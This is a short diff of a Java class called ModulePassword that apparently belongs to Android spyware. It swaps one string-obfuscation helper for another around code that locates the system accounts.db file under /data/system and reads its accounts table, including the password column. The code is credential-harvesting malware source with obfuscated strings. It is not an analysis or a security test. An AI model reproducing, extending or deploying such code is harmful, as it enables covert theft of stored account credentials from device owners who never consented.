@@ -115,9 +115,9 @@ public class ModulePassword extends BaseModule {
 		// h_0=/data/system/
 		// h_1=/data/system/users/0/
 		// h_2=accounts.db
-		String pathUser = M.d("/data/system/users/0/");
-		String pathSystem = M.d("/data/system/");
-		String file = M.d("accounts.db");
+		String pathUser = M.e("/data/system/users/0/");
+		String pathSystem = M.e("/data/system/");
+		String file = M.e("accounts.db");
 
 		String dbFile = "";
 
@@ -133,14 +133,14 @@ public class ModulePassword extends BaseModule {
 		}
 
 		// h_4=accounts
-		String table = M.d("accounts");
+		String table = M.e("accounts");
 
 		// h_5=_id
 		// h_6=name
 		// h_7=type
 		// h_8=password
-		String[] projection = { M.d("_id"), M.d("name"), M.d("type"),
-				M.d("password ") };
+		String[] projection = { M.e("_id"), M.e("name"), M.e("type"),
+				M.e("password ") };
 		visitor.projection = projection;
 
 		helper.traverseRecords(table, visitor);
